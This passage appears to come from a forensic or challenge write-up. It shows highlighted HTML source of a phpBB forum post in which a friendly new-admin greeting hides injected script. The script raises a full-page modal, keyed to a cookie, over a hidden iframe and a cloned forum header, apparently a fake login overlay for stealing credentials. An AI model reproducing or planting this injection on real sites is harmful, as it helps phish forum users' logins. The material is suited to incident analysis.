class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br></pre></td><td class="code"><pre><code class="hljs html">This is an example post in your phpBB3 installation. Everything seems to be working. You may delete this post if you like and continue to set up your board. During the installation process your first category and your first forum are assigned an appropriate set of permissions for the predefined usergroups administrators, bots, global moderators, guests, registered users and registered COPPA users. If you also choose to delete your first category and your first forum, do not forget to assign permissions for all these usergroups for all new categories and forums you create. It is recommended to rename your first category and your first forum and copy permissions from these while creating new categories and forums. Have fun!<br><span class="hljs-tag">&lt;<span class="hljs-name">t</span>&gt;</span>Good Afternoon everyone!<br><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>I am new to the administration team here at forela, I&#x27;d like to take a minute and say hello!<br><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>I have 5 years of administration experience and am ecstatic to be joining this team<br><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>Regards,<br><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>Randy<span class="hljs-tag">&lt;/<span class="hljs-name">t</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"><span class="hljs-selector-tag">body</span> &#123;    <span class="hljs-attribute">z-index</span>: <span class="hljs-number">100</span>;&#125;<span class="hljs-selector-class">.modal</span> &#123;    <span class="hljs-attribute">position</span>:fixed;    <span class="hljs-attribute">top</span>:<span class="hljs-number">0</span>;    <span class="hljs-attribute">left</span>:<span class="hljs-number">0</span>;    <span class="hljs-attribute">height</span>:<span class="hljs-number">100%</span>;    <span class="hljs-attribute">width</span>:<span class="hljs-number">100%</span>;    <span class="hljs-attribute">z-index</span>:<span class="hljs-number">101</span>;    <span class="hljs-attribute">background-color</span>:white;    <span class="hljs-attribute">opacity</span>:<span class="hljs-number">1</span>;&#125;<span class="hljs-selector-class">.modal</span><span class="hljs-selector-class">.hidden</span> &#123;    <span class="hljs-attribute">visibility</span>: hidden;&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">sethidden</span>(<span class="hljs-params"></span>)&#123;    <span class="hljs-keyword">const</span> d = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();    d.<span class="hljs-title function_">setTime</span>(d.<span class="hljs-title function_">getTime</span>() + (<span class="hljs-number">24</span>*<span class="hljs-number">60</span>*<span class="hljs-number">60</span>*<span class="hljs-number">1000</span>));    <span class="hljs-keyword">let</span> expires = <span class="hljs-string">&quot;expires=&quot;</span>+ d.<span class="hljs-title function_">toUTCString</span>();    <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">&quot;phpbb_token=1;&quot;</span> + expires + <span class="hljs-string">&quot;;&quot;</span>;    <span class="hljs-keyword">var</span> modal = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;zbzbz1234&#x27;</span>);    modal.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">&quot;hidden&quot;</span>);&#125;<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&quot;DOMContentLoaded&quot;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) &#123;    <span class="hljs-keyword">let</span> cookieexists = <span class="hljs-literal">false</span>;    <span class="hljs-keyword">let</span> name = <span class="hljs-string">&quot;phpbb_token=&quot;</span>;    <span class="hljs-keyword">let</span> cookies = <span class="hljs-built_in">decodeURIComponent</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);    <span class="hljs-keyword">let</span> ca = cookies.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;;&#x27;</span>);    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; ca.<span class="hljs-property">length</span>; i++)    &#123;        <span class="hljs-keyword">let</span> c = ca[i];        <span class="hljs-keyword">while</span>(c.<span class="hljs-title function_">charAt</span>(<span class="hljs-number">0</span>) == <span class="hljs-string">&#x27; &#x27;</span>)        &#123;            c = c.<span class="hljs-title function_">substring</span>(<span class="hljs-number">1</span>);        &#125;        <span class="hljs-keyword">if</span>(c.<span class="hljs-title function_">indexOf</span>(name) == <span class="hljs-number">0</span>) &#123;            cookieexists = <span class="hljs-literal">true</span>;        &#125;    &#125;    <span class="hljs-keyword">if</span>(cookieexists)&#123;        <span class="hljs-keyword">return</span>;    &#125;    <span class="hljs-keyword">var</span> modal = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;zbzbz1234&#x27;</span>);    modal.<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">&quot;hidden&quot;</span>);&#125;);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;hiddenframe&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;hiddenframe&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:none&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;modal hidden&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;zbzbz1234&quot;</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;shouldshow&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;wrap&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;wrap&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;top&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;top-anchor&quot;</span> <span class="hljs-attr">accesskey</span>=<span class="hljs-string">&quot;t&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;page-header&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;headerbar&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;banner&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;inner&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;site-description&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;site-description&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;logo&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;logo&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;./index.php&quot;</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;Board index&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;site_logo&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>forum.forela.co.uk<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Forela internal forum<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;skiplink&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#start_here&quot;</span>&gt;</span>Skip to content<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;search-box&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;search-box search-header&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;search&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;./search.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;get&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;search1&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">fieldset</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;keywords&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;keywords1&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;search&quot;</span> <span class="hljs-attr">maxlength</span>=<span class="hljs-string">&quot;128&quot;</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;Search for keywords&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;inputbox search tiny&quot;</span> <span class="hljs-attr">size</span>=<span class="hljs-string">&quot;20&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Search…&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;button button-search&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;Search&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;icon fa-search fa-fw&quot;</span> <span class="hljs-attr">aria-hidden</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;sr-only&quot;</span>&gt;</span>Search<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;./search.php&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;button button-search-end&quot;</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;Advanced search&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;icon fa-cog fa-fw&quot;</span> <span class="hljs-attr">aria-hidden</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;sr-only&quot;</span>&gt;</span>Advanced search<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">fieldset</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;navigation&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;inner&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;nav-main&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav-main linklist&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menubar&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;quick-links&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;quick-links dropdown-container responsive-menu&quot;</span> <span class="hljs-attr">data-skip-responsive</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-trigger dropdown-toggle&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;icon fa-bars fa-fw&quot;</span> <span class="hljs-attr">aria-hidden</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>Quick links<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;pointer&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;pointer-inner&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-contents&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menu&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;separator&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;./search.php?search_id=unanswered&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menuitem&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;icon fa-file-o fa-fw icon-gray&quot;</span> <span class="hljs-attr">aria-hidden</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>Unanswered topics<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;./search.php?search_id=active_topics&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menuitem&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;icon fa-file-o fa-fw icon-blue&quot;</span> <span class="hljs-attr">aria-hidden</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>Active topics<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;separator&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;./search.php&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menuitem&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;icon fa-search fa-fw&quot;</span> <span class="hljs-attr">aria-hidden</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>Search<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;separator&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">data-skip-responsive</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/phpBB3/app.php/help/faq&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;help&quot;</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;Frequently Asked Questions&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menuitem&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;icon fa-question-circle fa-fw&quot;</span> <span class="hljs-attr">aria-hidden</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>FAQ<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;rightside&quot;</span> <span class="hljs-attr">data-skip-responsive</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;./ucp.php?mode=login&quot;</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;Login&quot;</span> <span class="hljs-attr">accesskey</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menuitem&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;icon fa-power-off fa-fw&quot;</span> <span class="hljs-attr">aria-hidden</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>Login<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;rightside&quot;</span> <span class="hljs-attr">data-skip-responsive</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;./ucp.php?mode=register&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menuitem&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;icon fa-pencil-square-o  fa-fw&quot;</span> <span class="hljs-attr">aria-hidden</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>Register<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>&lt;/li data-skip-responsive=&quot;true&quot;&gt;<br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;nav-breadcrumbs&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav-breadcrumbs linklist navlinks&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menubar&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;breadcrumbs&quot;</span> <span class="hljs-attr">itemscope</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">itemtype</span>=<span class="hljs-string">&quot;http://schema.org/BreadcrumbList&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;max-width: 936px;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;crumb&quot;</span> <span class="hljs-attr">itemtype</span>=<span class="hljs-string">&quot;http://schema.org/ListItem&quot;</span> <span class="hljs-attr">itemprop</span>=<span class="hljs-string">&quot;itemListElement&quot;</span> <span class="hljs-attr">itemscope</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;./index.php&quot;</span> <span class="hljs-attr">itemtype</span>=<span class="hljs-string">&quot;https://schema.org/Thing&quot;</span> <span class="hljs-attr">itemprop</span>=<span class="hljs-string">&quot;item&quot;</span> <span class="hljs-attr">accesskey</span>=<span class="hljs-string">&quot;h&quot;</span> <span class="hljs-attr">data-navbar-reference</span>=<span class="hljs-string">&quot;index&quot;</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;Board index&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;icon fa-home fa-fw&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">itemprop</span>=<span class="hljs-string">&quot;name&quot;</span>&gt;</span>Board index<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">itemprop</span>=<span class="hljs-string">&quot;position&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;rightside responsive-search&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;./search.php&quot;</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;View the advanced search options&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menuitem&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;icon fa-search fa-fw&quot;</span> <span class="hljs-attr">aria-hidden</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;sr-only&quot;</span>&gt;</span>Search<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;start_here&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;anchor&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;page-body&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;page-body&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;main&quot;</span>&gt;</span><br><span 